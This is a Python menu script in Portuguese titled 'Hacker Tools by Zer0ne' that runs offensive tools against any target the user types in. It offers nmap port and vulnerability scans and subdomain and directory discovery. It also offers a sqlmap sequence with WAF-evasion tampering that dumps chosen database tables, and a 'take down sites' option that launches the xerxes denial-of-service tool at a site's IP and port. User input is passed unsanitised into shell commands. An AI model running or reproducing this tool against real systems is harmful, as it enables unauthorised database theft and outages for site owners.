import time
import os

class Cor:
    RESET = "\033[0m"
    PRETO = "\033[30m"
    VERMELHO = "\033[31m"
    VERDE = "\033[32m"
    AMARELO = "\033[33m"
    AZUL = "\033[34m"
    MAGENTA = "\033[35m"
    CIANO = "\033[36m"
    BRANCO = "\033[37m"

os.system("clear")

def capa():
    print(Cor.VERDE + """
         .AMMMMMMMMMMA.          
       .AV. :::.:.:.::MA.        
      A' :..        : .:`A       
     A'..              . `A.     
    A' :.    :::::::::  : :`A    
    M  .    :::.:.:.:::  . .M    
    M  :   ::.:.....::.:   .M    
    V : :.::.:........:.:  :V    
   A  A:    ..:...:...:.   A A   
  .V  MA:.....:M.::.::. .:AM.M   
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
:M .  .`VMMMMMMV.:A `VMMMMV .:M: 
 V.:.  ..`VMMMV.:AM..`VMV' .: V  
  V.  .:. .....:AMMA. . .:. .V   
   VMM...: ...:.MMMM.: .: MMV    
       `VM: . ..M.:M..:::M'      
         `M::. .:.... .::M       
          M:.  :. .... ..M       
          V:  M:. M. :M .V       
          `V.:M.. M. :M.V'
          
          
 Hacker Tools by Zer0ne      
          """ + Cor.RESET)
capa()

def ferramentas():
    print(Cor.VERDE + """
1 - Descobrir Portas Abertas
2 - Encontrar Vulnerabilidades em Sites PHP
3 - Acessar Banco de Dados de sites
4 - Encontrar Vulnerabilidades
5 - Encontrar Subdominíos vulneráveis
6 - Encontrar diretorios
7 - Encontrar Subdominíos
8 - Derrubar sites
9 - SAIR
    """ + Cor.RESET)
    
ferramentas()    

while True:
    op = int(input(Cor.AZUL + "kali@localhost $ " + Cor.RESET))
    
    if op > 8:
        os.system("clear")
        print(Cor.VERMELHO + "[*] Error: Nenhuma opção selecionada" + Cor.RESET)
        time.sleep(2)
        os.system("clear")
        capa()
        ferramentas()
        continue

    elif op == 1:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        os.system("clear")
        try:
            os.system(f"nmap -T4 -sV -A -Pn {alvo}")
        except KeyboardInterrupt:
            print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue

    elif op == 2:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        if "https://" in alvo:
            alvo = alvo.replace("https://", "")
        elif "http://" in alvo:
            alvo = alvo.replace("http://", "") 
        os.system("clear")
        try:
            os.system(f"echo {alvo} | cariddi -e php")
        except KeyboardInterrupt:
            print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
        print()
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue    

    elif op == 3:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        os.system("clear")
        try:
            os.system(f'python %USERPROFILE%\\tools\\sqlmap\\sqlmap.py -u "{alvo}" --random-agent --tamper=space2comment --dbs')
            database = input(Cor.VERDE + "[*] Insira o Banco para acessar: " + Cor.RESET)
            os.system("clear")
            os.system(f'python %USERPROFILE%\\tools\\sqlmap\\sqlmap.py -u "{alvo}" --random-agent --tamper=space2comment -D {database} --tables')
            tables = input(Cor.VERDE + "[*] Insira as Tabelas para acessar: " + Cor.RESET)
            os.system("clear")
            os.system(f'python %USERPROFILE%\\tools\\sqlmap\\sqlmap.py -u "{alvo}" --random-agent --tamper=space2comment -D {database} -T {tables} --columns')
            columns = input(Cor.VERDE + "[*] Insira os dados para puxar: " + Cor.RESET)
            os.system("clear")
            os.system(f'python %USERPROFILE%\\tools\\sqlmap\\sqlmap.py -u "{alvo}" --random-agent --tamper=space2comment -D {database} -T {tables} -C {columns} --dump')
        except KeyboardInterrupt:
            print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
        print()
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue    

    elif op == 4:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        os.system("clear")
        try:
            os.system(f"nmap -sV --script vuln -Pn -T4 -A {alvo}")        
        except KeyboardInterrupt:
            print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
        print()
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue   

    elif op == 5:
        print()
        print(Cor.VERDE + "Você deve ter um arquivo com os subdomínios deseja continuar?" + Cor.RESET)
        print()
        escolha = input("(y/n): ")
        if escolha == "y":
            print()
            arquivo = input(Cor.VERMELHO + "Digite o Caminho do Arquivo: " + Cor.RESET)
            os.system("clear")
            print(Cor.VERMELHO + "[*] Atenção: Aperte CTRL + C quando quiser parar." + Cor.RESET)
            time.sleep(3)
            os.system("clear")
            try:
                os.system(f"subzy run --targets {arquivo}")
            except KeyboardInterrupt:
                print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
            while True:
                esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
                if esc == "y":
                    os.system("clear")
                    capa()
                    ferramentas()
                    break
                elif esc == "n":
                    exit()
                else:
                    continue
        elif escolha == "n":
            os.system("clear")
            capa()
            ferramentas()
        else:
            exit()    

    elif op == 6:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        print()
        print(Cor.VERDE + "Desejas usar uma wordlist personalizada?" + Cor.RESET)
        print()
        escolha = input(Cor.VERDE + "(y/n): " + Cor.RESET)
        if escolha == "y":
            print()
            arquivo = input(Cor.VERMELHO + "Digite o caminho da wordlist: " + Cor.RESET)
            os.system("clear")
            try:
                os.system(f"gobuster dir -u {alvo} -w {arquivo} -t 50 -b 403")
            except KeyboardInterrupt:
                print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
            while True:
                esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
                if esc == "y":
                    os.system("clear")
                    capa()
                    ferramentas()
                    break
                elif esc == "n":
                    exit()
                else:
                    continue
        elif escolha == "n":
            os.system("clear")
            try:
                os.system(f"gobuster dir -u {alvo} -w directory-list-2.3-medium.txt -t 50 -b 403")
            except KeyboardInterrupt:
                print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
            while True:
                esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
                if esc == "y":
                    os.system("clear")
                    capa()
                    ferramentas()
                    break
                elif esc == "n":
                    exit()
                else:
                    continue
        else:
            exit() 

    elif op == 7:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        if "https://" in alvo:
            alvo = alvo.replace("https://", "")
        elif "http://" in alvo:
            alvo = alvo.replace("http://", "")
        if "www." in alvo:
            alvo = alvo.replace("www.", "")
        os.system("clear")
        try:
            os.system(f"subfinder -d {alvo} | httpx -o lives.txt")
        except KeyboardInterrupt:
            print(Cor.AMARELO + "\n[*] Execução interrompida pelo usuário" + Cor.RESET)
        os.system("clear")
        print(Cor.VERDE + "Arquivo salvo com os subdominios: lives.txt")
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue

    elif op == 8:
        print()
        alvo = input(Cor.VERMELHO + "Alvo: " + Cor.RESET)
        if "https://" in alvo:
            alvo = alvo.replace("https://", "")
        elif "http://" in alvo:
            alvo = alvo.replace("http://", "")    
        os.system("clear")
        print(Cor.VERMELHO + "[*] O ip do seu alvo aparecerá em breve copie ele para continuar o ataque!" + Cor.RESET)
        time.sleep(3)
        os.system("clear")
        os.system(f"nslookup {alvo}")
        print()
        os.system(f"nmap -T4 --open -F {alvo}")
        print()
        ip = input(Cor.VERMELHO + "Digite o ip: " + Cor.RESET)
        print()
        port = input(Cor.VERMELHO + "Digite a porta: " + Cor.RESET)
        os.system("clear")
        print(Cor.VERMELHO + "[*] O ataque começou aperte CTRL + C quando quiser parar!" + Cor.RESET)
        print()
        os.system(f"./xerxes {ip} {port}")
        while True:
            esc = input(Cor.VERDE + "Deseja Continuar? (y/n): " + Cor.RESET)
            if esc == "y":
                os.system("clear")
                capa()
                ferramentas()
                break
            elif esc == "n":
                exit()
            else:
                continue
        
        
    elif op == 9:
        os.system("clear")
        exit()    

    else:
        os.system("clear")
        capa()
        ferramentas()
        continue

